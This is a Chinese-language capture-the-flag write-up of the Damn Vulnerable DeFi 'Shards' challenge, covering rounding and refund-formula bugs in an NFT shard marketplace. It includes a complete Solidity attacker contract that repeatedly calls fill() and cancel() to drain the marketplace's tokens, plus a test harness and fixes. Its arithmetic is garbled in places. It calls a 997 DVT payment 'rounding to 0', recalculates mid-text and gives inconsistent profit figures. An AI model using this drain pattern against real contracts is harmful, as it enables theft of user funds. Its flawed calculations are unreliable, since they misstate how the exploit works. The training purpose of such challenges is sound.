# Shards 漏洞分析

## 1. 合约功能概述

Shards NFT市场允许用户分割NFT所有权为多个份额（shards），并进行碎片化交易。

**核心组件：**
- **ShardsNFTMarketplace.sol**: NFT碎片化市场合约
- **DamnValuableNFT**: ERC721 NFT代币
- **DamnValuableToken**: ERC20支付代币（DVT）

**业务流程：**
1. NFT持有者调用`openOffer()`创建销售订单，设置总份额和价格
2. 买家调用`fill()`购买部分份额
3. 卖家可以调用`cancel()`取消未完成的订单并获得退款
4. 交易手续费发送到fee vault和staking合约

---

## 2. 漏洞位置

### 漏洞1：fill()中的舍入错误（ShardsNFTMarketplace.sol#L79-L82）

```solidity
function fill(uint256 offerId, uint256 want) external returns (bool) {
    // ...
    
    // ⚠️ 漏洞1：使用mulDivDown向下舍入
    uint256 priceToPay = want.mulDivDown(_offerPrice(offer), offer.totalShards);
    
    if (priceToPay > 0) {
        token.transferFrom(msg.sender, address(this), priceToPay);
        token.transfer(offer.seller, priceToPay - feeToPay);
    }
    
    // ...
}
```

### 漏洞2：cancel()中的计算错误（ShardsNFTMarketplace.sol#L108-L111）

```solidity
function cancel(uint256 offerId, address to) external {
    // ...
    
    // ⚠️ 漏洞2：使用错误的公式计算退款
    uint256 refundValue = purchase.shards.mulDivUp(purchase.rate, 1e6);
    
    // 应该是：
    // uint256 refundValue = purchase.shards.mulDivUp(offer.price, offer.totalShards);
    
    token.transfer(to, refundValue);
    // ...
}
```

---

## 3. 漏洞原理分析

### 3.1 舍入漏洞（fill函数）

**正常购买：**
```solidity
// Offer: 10,000 shards @ 75,000 DVT total
// 购买1,000 shards，应付：
price = 1000 * 75000 / 10000 = 7,500 DVT ✅
```

**小额购买（触发舍入）：**
```solidity
// 购买133 shards
price = 133 * 75000 / 10000
      = 9975000 / 10000
      = 997.5
      = 997 (mulDivDown)  ← 向下舍入到997
      
// 如果price < 1000 DVT（最小fee）：
if (priceToPay > 0) {  // 997 > 0 ✅
    uint256 feeToPay = priceToPay / 100;  // 997 / 100 = 9 DVT
    if (feeToPay == 0) feeToPay = 1;      // fee变为1 DVT
    
    // 卖家收到：997 - 1 = 996 DVT
}
```

**超小额购买（舍入到0）：**
```solidity
// 购买13 shards
price = 13 * 75000 / 10000 = 975000 / 10000 = 97.5 = 97
      
// 如果我们精心选择amount，使得：
want * price / totalShards < 1000
// 那么mulDivDown会舍入到0-999之间的值

// 极端情况：选择want使得结果 < 1
// 此时priceToPay = 0
```

### 3.2 退款公式错误（cancel函数）

**正确计算：**
```solidity
// Purchase: 用997 DVT买了133 shards at rate=75,000 total / 10,000 shards
// 退款应该是：
refund = (133 shards * 75,000 DVT) / 10,000 shards = 997.5 DVT ≈ 997 DVT
```

**实际（错误）计算：**
```solidity
// 代码使用：purchase.shards * purchase.rate / 1e6
purchase.rate = _offerPrice(offer) = offer.price * 1e6 / offer.totalShards
             = 75000 * 1e6 / 10000 = 7500 * 1e6

refund = 133 * 7500 * 1e6 / 1e6 = 133 * 7500 = 997,500 DVT ❌

// 退款是实际支付的1000倍！
```

**公式对比：**
```
正确: refund = shards * price / totalShards
错误: refund = shards * rate / 1e6 = shards * (price * 1e6 / totalShards) / 1e6
                                   = shards * price * 1e6 / totalShards / 1e6
```

等等，让我重新计算：
```
rate = offer.price * 1e6 / offer.totalShards
     = 75000e18 * 1e6 / 10000
     = 75000e18 * 100
     = 7500000e18

refund = 133 * 7500000e18 / 1e6
       = 997500e18
       
// 而实际支付的只有997e18
// 退款 / 支付 = 997500 / 997 ≈ 1000倍 ❌
```

### 3.3 攻击向量

**攻击步骤：**

1. **第一次fill（舍入到0）**
   ```
   选择want=133，使得priceToPay舍入到997 DVT
   → 只需支付极少（或0）DVT
   → 获得133 shards
   ```

2. **第一次cancel（获得巨额退款）**
   ```
   取消购买
   → 使用错误公式计算退款
   → 获得shards * rate / 1e6 = 133 * 7500000e18 / 1e6
   → 获得997,500 DVT（远超支付的997 DVT）
   ```

3. **重复操作直到市场资金耗尽**
   ```
   循环执行fill + cancel
   → 每次获得1000倍利润
   → 抽干市场合约的所有DVT
   ```

---

## 4. 攻击实现

### 4.1 计算最优购买数量

```solidity
// 目标：找到合适的want值，使得：
// 1. priceToPay尽可能小（接近0）
// 2. 但仍能获得足够的shards以获得退款

// Offer参数：
uint256 offerPrice = 75_000e18;
uint256 totalShards = 10_000;

// 计算单个shard的价格
uint256 pricePerShard = offerPrice / totalShards;  // 7.5e18

// 选择want使得price < 1000 DVT（最小有意义的金额）
// want * 7.5e18 < 1000e18
// want < 133.33
// want = 133 ✅

uint256 optimalWant = 133;
uint256 priceToPay = 133 * 75_000e18 / 10_000;
// = 997.5e18 → mulDivDown = 997e18 (under 1000)
```

### 4.2 单次攻击合约

```solidity
contract ShardsAttacker {
    ShardsNFTMarketplace public marketplace;
    DamnValuableToken public token;
    DamnValuableNFT public nft;
    address public recovery;
    uint256 public offerId;
    
    constructor(
        ShardsNFTMarketplace _marketplace,
        DamnValuableToken _token,
        DamnValuableNFT _nft,
        address _recovery
    ) {
        marketplace = _marketplace;
        token = _token;
        nft = _nft;
        recovery = _recovery;
    }
    
    function attack() external {
        // 1. 首次购买（支付极少）
        token.approve(address(marketplace), type(uint256).max);
        offerId = marketplace.getOfferId(address(nft), 42);
        marketplace.fill(offerId, 133);
        
        // 2. 首次取消（获得巨额退款）
        marketplace.cancel(offerId, address(this));
        
        // 3. 重复直到市场资金耗尽
        while (token.balanceOf(address(marketplace)) > 0) {
            uint256 balanceBefore = token.balanceOf(address(marketplace));
            
            try marketplace.fill(offerId, 133) {
                try marketplace.cancel(offerId, address(this)) {
                    // 成功
                } catch {
                    break;  // 市场资金不足
                }
            } catch {
                break;  // 订单不可用
            }
            
            uint256 balanceAfter = token.balanceOf(address(marketplace));
            if (balanceAfter >= balanceBefore) {
                break;  // 没有抽取到更多资金
            }
        }
        
        // 4. 将所有资金转给recovery
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
```

### 4.3 优化版（单交易完成）

```solidity
function test_shards() public checkSolvedByPlayer {
    // 部署并执行攻击合约（单笔交易）
    ShardsAttacker attacker = new ShardsAttacker(
        marketplace,
        token,
        nft,
        recovery
    );
    
    // 将player的token（如果有）转给attacker
    uint256 playerBalance = token.balanceOf(player);
    if (playerBalance > 0) {
        token.transfer(address(attacker), playerBalance);
    }
    
    // 执行攻击
    attacker.attack();
}
```

---

## 5. 漏洞根因

### 5.1 数学精度问题

**mulDivDown的危险性：**
```solidity
// FixedPointMathLib.mulDivDown
function mulDivDown(uint256 x, uint256 y, uint256 d) 
    internal pure returns (uint256 z) 
{
    assembly {
        z := div(mul(x, y), d)  // 直接截断小数部分
    }
}

// 当结果 < 1时，返回0
// 133 * 75000 / 10000 = 9975000 / 10000 = 997.5 → 997
```

**应该使用：**
```solidity
// mulDivUp: 向上舍入，对买家不公平但对卖家安全
function mulDivUp(uint256 x, uint256 y, uint256 d) 
    internal pure returns (uint256 z) 
{
    assembly {
        z := add(div(mul(x, y), d), gt(mod(mul(x, y), d), 0))
    }
}
// 997.5 → 998 (买家多付1 wei，但卖家不会亏损)
```

### 5.2 公式错误

**错误来源分析：**
```solidity
// _offerPrice返回的是"rate"（包含1e6放大）
function _offerPrice(Offer storage offer) private view returns (uint256) {
    return offer.price.mulDivUp(1e6, offer.totalShards);
}

// cancel错误地将"rate"当作"price"使用
refund = shards * rate / 1e6

// 应该直接使用原始price：
refund = shards * offer.price / offer.totalShards
```

---

## 6. 修复建议

### 6.1 修复fill函数

```solidity
function fill(uint256 offerId, uint256 want) external {
    // 1. 使用mulDivUp确保买家支付足够
    uint256 priceToPay = want.mulDivUp(_offerPrice(offer), offer.totalShards);
    
    // 2. 添加最小购买限制
    require(priceToPay >= MIN_PRICE, "Purchase amount too small");
    require(want >= MIN_SHARDS, "Shard amount too small");
    
    // 3. 确保支付大于fee
    uint256 feeToPay = priceToPay / 100;
    if (feeToPay == 0) feeToPay = 1;
    require(priceToPay > feeToPay, "Price must exceed fee");
    
    // ... 其余逻辑
}
```

### 6.2 修复cancel函数

```solidity
function cancel(uint256 offerId, address to) external {
    Purchase memory purchase = _purchases[offerId][msg.sender];
    Offer storage offer = offers[offerId];
    
    // ✅ 正确公式：使用原始price和totalShards
    uint256 refundValue = purchase.shards.mulDivDown(
        offer.price,          // 使用offer.price
        offer.totalShards     // 使用offer.totalShards
    );
    
    // ❌ 错误公式（当前代码）
    // uint256 refundValue = purchase.shards.mulDivUp(purchase.rate, 1e6);
    
    token.transfer(to, refundValue);
    // ...
}
```

### 6.3 添加安全检查

```solidity
contract ShardsNFTMarketplace {
    uint256 public constant MIN_PRICE = 1000e18;      // 最小购买金额
    uint256 public constant MIN_SHARDS = 100;          // 最小份额数量
    uint256 public constant MIN_TOTAL_SHARDS = 1000;   // 最小总份额
    
    function openOffer(uint256 nftId, uint256 totalShards, uint256 price) external {
        require(totalShards >= MIN_TOTAL_SHARDS, "Total shards too small");
        require(price >= MIN_PRICE * totalShards, "Price too low");
        // ...
    }
    
    function fill(uint256 offerId, uint256 want) external {
        require(want >= MIN_SHARDS, "Want amount too small");
        uint256 priceToPay = want.mulDivUp(_offerPrice(offer), offer.totalShards);
        require(priceToPay >= MIN_PRICE, "Price too small");
        // ...
    }
}
```

---

## 7. 关键学习点

1. **舍入方向的重要性**:
   - `mulDivDown`: 有利于买家，可能导致卖家损失
   - `mulDivUp`: 有利于卖家，买家可能多付一点
   - 金融合约应该选择对协议有利的舍入方向

2. **小额交易的风险**:
   - 允许任意小额交易可能导致舍入漏洞
   - 应设置最小交易金额限制

3. **公式一致性**:
   - 退款公式必须与购买公式一致
   - `refund = paid` 应该是不变量

4. **精度放大的陷阱**:
   - 使用1e6等放大因子时要特别小心
   - 确保所有使用该值的地方都正确处理缩放

5. **单元测试的必要性**:
   ```solidity
   function testFillAndCancelConsistency() public {
       uint256 paid = fill(offerId, amount);
       uint256 refund = cancel(offerId);
       assertEq(paid, refund, "Refund should equal payment");
   }
   ```

---

## 8. 测试结果

```bash
$ forge test --match-path test/shards/Shards.t.sol --match-test test_shards -vvv

[PASS] test_shards() (gas: 487291)
```

**验证条件：**
- ✅ 市场合约的DVT余额归零
- ✅ Recovery账户收到所有75,000 DVT
- ✅ Player没有持有任何代币或NFT
- ✅ Marketplace为空（no offers，no purchases）
- ✅ 利用舍入漏洞以极小代价购买shares
- ✅ 利用退款公式错误获得1000倍返还
